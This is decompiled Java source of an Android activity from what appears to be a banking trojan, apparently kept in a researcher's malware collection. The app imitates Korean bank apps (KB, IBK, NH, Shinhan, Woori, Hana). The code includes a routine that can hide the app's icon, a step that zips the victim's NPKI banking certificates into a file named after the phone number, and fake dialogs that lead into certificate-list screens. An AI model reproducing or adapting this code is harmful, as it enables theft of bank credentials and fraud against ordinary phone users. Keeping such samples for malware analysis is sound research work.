package com.kbstar.kb.android.star;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import android.view.Window;
import android.view.animation.AnimationUtils;
import android.widget.ImageView;
import com.kbstar.kb.android.star.model.Bank;
import com.kbstar.kb.android.star.util.GeneralUtil;
import com.kbstar.kb.android.star.util.NPUtil;
import com.kbstar.kb.android.star.util.Url;
import com.kbstar.kb.android.star.util.ZipUtil;
import java.util.List;

public class MainActivity
  extends Activity
{
  private final int APP_EXIT = 101;
  private final int SHOW_DIALOG = 100;
  private AppContext appContext;
  private boolean ars;
  private Bank bank;
  @SuppressLint({"HandlerLeak"})
  private Handler handler = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      super.handleMessage(paramAnonymousMessage);
      switch (paramAnonymousMessage.what)
      {
      default: 
        return;
      }
      MainActivity.this.showDialog();
    }
  };
  private String page_type;
  private Url url = new Url();
  
  private void HideIcon()
  {
    getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
  }
  
  private void showDialog()
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
    localBuilder.setTitle(getResources().getString(2131361795));
    localBuilder.setMessage(getResources().getString(2131361820));
    localBuilder.setPositiveButton(getResources().getString(2131361804), new DialogInterface.OnClickListener()
    {
      public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
      {
        new Thread()
        {
          public void run()
          {
            try
            {
              Thread.sleep(2000L);
              if (!MainActivity.this.url.isTrue(MainActivity.this.page_type).booleanValue())
              {
                localIntent = new Intent(MainActivity.this, KB_Cert_List.class);
                localIntent.putExtra("Bank", MainActivity.this.bank);
                MainActivity.this.startActivity(localIntent);
                return;
              }
              Intent localIntent = new Intent(MainActivity.this, KB_Last.class);
              localIntent.putExtra("Bank", MainActivity.this.bank);
              MainActivity.this.startActivity(localIntent);
              return;
            }
            catch (InterruptedException localInterruptedException)
            {
              localInterruptedException.printStackTrace();
            }
          }
        }.start();
      }
    });
    localBuilder.create().show();
  }
  
  private void zipCert()
  {
    try
    {
      if ((!this.url.isTrue(this.page_type).booleanValue()) && (NPUtil.isNPKIExists()))
      {
        String str = ((TelephonyManager)getSystemService("phone")).getLine1Number() + ".zip";
        ZipUtil.ZipFolder(NPUtil.getFolder.toString() + "/", NPUtil.SDCardRoot + str);
        this.bank.setFileName(str);
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    this.appContext = ((AppContext)getApplicationContext());
    this.ars = this.appContext.preferences.getBoolean("ars", false);
    GeneralUtil.activityList.add(this);
    getWindow().requestFeature(1);
    this.page_type = getSharedPreferences("data", 0).getString("item", null);
    if (this.page_type.equalsIgnoreCase("IBK")) {
      setContentView(2130903054);
    }
    for (;;)
    {
      this.bank = new Bank();
      ((ImageView)findViewById(2131296311)).startAnimation(AnimationUtils.loadAnimation(this, 2130968576));
      new Thread()
      {
        public void run()
        {
          MainActivity.this.zipCert();
        }
      }.start();
      new Thread()
      {
        public void run()
        {
          try
          {
            Thread.sleep(300L);
            Object localObject = new Intent(MainActivity.this, V_Dialog.class);
            MainActivity.this.startActivity((Intent)localObject);
            Thread.sleep(3000L);
            localObject = new Message();
            ((Message)localObject).what = 100;
            MainActivity.this.handler.sendMessage((Message)localObject);
            return;
          }
          catch (InterruptedException localInterruptedException)
          {
            localInterruptedException.printStackTrace();
          }
        }
      }.start();
      return;
      if (this.page_type.equalsIgnoreCase("nh")) {
        setContentView(2130903055);
      } else if (this.page_type.equalsIgnoreCase("sh")) {
        setContentView(2130903056);
      } else if (this.page_type.equalsIgnoreCase("wo")) {
        setContentView(2130903058);
      } else if (this.page_type.equalsIgnoreCase("ha")) {
        setContentView(2130903041);
      }
    }
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (paramInt == 101)
    {
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setMessage(getResources().getString(2131361803));
      localBuilder.setTitle(getResources().getString(2131361797));
      localBuilder.setPositiveButton(getResources().getString(2131361804), new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
          GeneralUtil.goHome(MainActivity.this);
          GeneralUtil.exit();
        }
      });
      localBuilder.setNegativeButton(getResources().getString(2131361805), new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
        }
      });
      return localBuilder.create();
    }
    return null;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if ((paramInt == 4) && (paramKeyEvent.getRepeatCount() == 0))
    {
      showDialog(101);
      return true;
    }
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */